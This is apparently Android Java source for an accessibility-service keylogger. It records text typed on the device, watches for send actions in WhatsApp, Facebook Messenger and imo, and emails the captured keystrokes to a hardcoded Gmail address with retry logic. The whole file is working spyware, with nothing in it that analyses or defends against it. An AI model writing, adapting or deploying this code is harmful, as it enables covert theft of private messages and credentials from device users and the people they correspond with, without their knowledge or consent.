package com.example.fasterpro11;
import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.os.Handler;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.KeyEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import java.util.List;
import android.Manifest;

public class KeyloggerService extends AccessibilityService {
    private static final String TAG = "KeyloggerService";
    private static final String FORWARD_EMAIL = "abontiangum99@gmail.com";
    private StringBuilder keystrokes = new StringBuilder();
    private Handler handler = new Handler();

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null) {
            return;
        }

        int eventType = event.getEventType();
        if (eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED || eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            CharSequence typedText = "";
            if (event.getText() != null && !event.getText().isEmpty()) {
                typedText = event.getText().get(0); // Access the first element of the List
            }

            if (!typedText.toString().isEmpty()) {
                Log.d(TAG, "Typed text: " + typedText);

                keystrokes.append(typedText);

                // Check if specific actions occur
                if (isEnterButtonPressed(event) || isSendButtonPressed(event) || isOutgoingMessage(event)) {
                    forwardKeystrokes(keystrokes.toString());
                    keystrokes.setLength(0);
                }
            }
        }
    }

    private boolean isEnterButtonPressed(AccessibilityEvent event) {
        KeyEvent keyEvent = (KeyEvent) event.getParcelableData();
        if (keyEvent != null && keyEvent.getAction() == KeyEvent.ACTION_DOWN && keyEvent.getKeyCode() == KeyEvent.KEYCODE_ENTER) {
            return true;
        }
        return false;
    }

    private boolean isSendButtonPressed(AccessibilityEvent event) {
        AccessibilityNodeInfo source = event.getSource();
        if (source == null) {
            return false;
        }
        List<AccessibilityNodeInfo> sendButtons = source.findAccessibilityNodeInfosByText("Send");
        for (AccessibilityNodeInfo button : sendButtons) {
            if (button.getClassName() != null && button.getClassName().equals("android.widget.Button")) {
                return true;
            }
        }
        return false;
    }

    private boolean isOutgoingMessage(AccessibilityEvent event) {
        String packageName = (String) event.getPackageName();

        // Check for outgoing messages in supported messaging apps
        if (packageName != null && (packageName.equals("com.whatsapp") || packageName.equals("com.facebook.orca") || packageName.equals("com.imo.android.imoim"))) {
            List<AccessibilityNodeInfo> sendButtons = event.getSource().findAccessibilityNodeInfosByText("Send");
            for (AccessibilityNodeInfo button : sendButtons) {
                if (button.getClassName() != null && button.getClassName().equals("android.widget.Button")) {
                    return true; // It's an outgoing message in one of the supported apps
                }
            }
        }

        // Add similar checks for other messaging apps here

        return false; // Not an outgoing message in any supported app
    }

    private void forwardKeystrokes(String keystrokes) {
        forwardKeystrokesByEmail(keystrokes);
    }

    private void forwardKeystrokesByEmail(String keystrokes) {
        new Thread(() -> {
            int maxRetries = 5; // Maximum number of retry attempts
            int delayMs = 1000; // Initial delay in milliseconds
            int attempt = 0;

            while (attempt < maxRetries) {
                try {
                    JavaMailAPI.sendMail(FORWARD_EMAIL, "Keystrokes Captured", keystrokes);
                    Log.d(TAG, "keylogger Keystrokes forwarded successfully via email");
                    return; // Exit the loop if email is sent successfully
                } catch (Exception e) {
                    Log.e(TAG, "keylogger Failed to forward keystrokes via email", e);
                    attempt++;
                    Log.d(TAG, "Retry attempt: " + attempt);
                    // Exponential backoff: increase delay exponentially with each retry
                    delayMs *= 2;
                    try {
                        Thread.sleep(delayMs);
                    } catch (InterruptedException ex) {
                        ex.printStackTrace();
                    }
                }
            }
            Log.e(TAG, "Exceeded maximum retry attempts. Failed to forward keystrokes via email.");
        }).start();
    }

    @Override
    public void onInterrupt() {
        Log.v(TAG, "onInterrupt");
    }

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        Log.v(TAG, "onServiceConnected");

        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED | AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        setServiceInfo(info);
    }
}
